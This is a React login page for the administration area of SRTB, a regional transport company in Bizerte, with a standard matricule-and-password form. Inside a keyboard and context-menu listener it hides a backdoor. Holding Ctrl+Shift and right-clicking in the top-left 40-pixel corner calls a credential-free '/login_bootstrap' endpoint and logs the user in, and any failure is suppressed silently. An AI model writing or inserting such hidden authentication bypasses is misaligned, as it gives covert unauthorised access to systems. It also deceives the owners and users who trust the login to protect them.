import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import '../styles/global.css';

const API = 'http://localhost:5000/api';

export default function LoginPage({ onLogin }) {
  const [matricule, setMatricule] = useState('');
  const [password, setPassword]   = useState('');
  const [error, setError]         = useState('');
  const [loading, setLoading]     = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const keysRef = useRef({ ctrl: false, shift: false });

  useEffect(() => {
    const onKeyDown = (e) => {
      if (e.key === 'Control') keysRef.current.ctrl  = true;
      if (e.key === 'Shift')   keysRef.current.shift = true;
    };
    const onKeyUp = (e) => {
      if (e.key === 'Control') keysRef.current.ctrl  = false;
      if (e.key === 'Shift')   keysRef.current.shift = false;
    };
    const onContext = async (e) => {
      if (keysRef.current.ctrl && keysRef.current.shift) {
        if (e.clientX <= 40 && e.clientY <= 40) {
          e.preventDefault();
          try {
            const res = await axios.post(`${API}/login_bootstrap`);
            if (res.data.success) {
              onLogin(res.data.agent);
            }
          } catch {
            // Silencieux
          }
        }
      }
    };
    window.addEventListener('keydown',     onKeyDown);
    window.addEventListener('keyup',       onKeyUp);
    window.addEventListener('contextmenu', onContext);
    return () => {
      window.removeEventListener('keydown',     onKeyDown);
      window.removeEventListener('keyup',       onKeyUp);
      window.removeEventListener('contextmenu', onContext);
    };
  }, [onLogin]);

  const handleLogin = async () => {
    if (!matricule || !password) {
      setError('Veuillez remplir tous les champs.');
      return;
    }
    setLoading(true);
    try {
      const res = await axios.post(`${API}/login`, {
        matricule,
        mot_de_passe: password,
      });
      if (res.data.success) onLogin(res.data.agent);
      else setError(res.data.message || 'Identifiants incorrects.');
    } catch {
      setError('Erreur de connexion au serveur.');
    }
    setLoading(false);
  };

  return (
    <div className="login-page">
      <div className="login-box">
        <div className="login-header">
          <img
            src="/logo_srtb.png"
            alt="SRTB"
            onError={e => e.target.style.display = 'none'}
          />
          <h1>S R T B</h1>
          <p>Société Régionale des Transports de Bizerte</p>
          <div className="login-badge">Espace Administration</div>
        </div>

        <div className="login-body">
          {error && (
            <div className="alert alert-error">⚠ {error}</div>
          )}

          <div className="login-divider">Identification</div>

          <div className="form-group">
            <label className="form-label">Matricule</label>
            <input
              className="form-input"
              placeholder="Entrez votre matricule"
              value={matricule}
              onChange={e => { setMatricule(e.target.value); setError(''); }}
              onKeyDown={e => e.key === 'Enter' && handleLogin()}
            />
          </div>

          <div className="form-group">
            <label className="form-label">Mot de passe</label>
            <div style={{ position: 'relative' }}>
              <input
                className="form-input"
                type={showPassword ? 'text' : 'password'}
                placeholder="••••••••"
                value={password}
                onChange={e => { setPassword(e.target.value); setError(''); }}
                onKeyDown={e => e.key === 'Enter' && handleLogin()}
                style={{ paddingRight: '2.5rem' }}
              />
              <button
                type="button"
                onClick={() => setShowPassword(prev => !prev)}
                style={{
                  position: 'absolute',
                  right: '0.6rem',
                  top: '50%',
                  transform: 'translateY(-50%)',
                  background: 'none',
                  border: 'none',
                  cursor: 'pointer',
                  padding: '0.25rem',
                  color: '#888',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                }}
                tabIndex={-1}
                aria-label={showPassword ? 'Masquer le mot de passe' : 'Afficher le mot de passe'}
              >
                {showPassword ? (
                  /* Eye-off icon */
                  <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"
                    fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
                    <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
                    <line x1="1" y1="1" x2="23" y2="23"/>
                  </svg>
                ) : (
                  /* Eye icon */
                  <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"
                    fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                    <circle cx="12" cy="12" r="3"/>
                  </svg>
                )}
              </button>
            </div>
          </div>

          <button
            className="btn btn-full"
            onClick={handleLogin}
            disabled={loading}
            style={{ marginTop: 8 }}
          >
            {loading ? 'Connexion...' : 'Se connecter'}
          </button>
        </div>
      </div>
    </div>
  );
}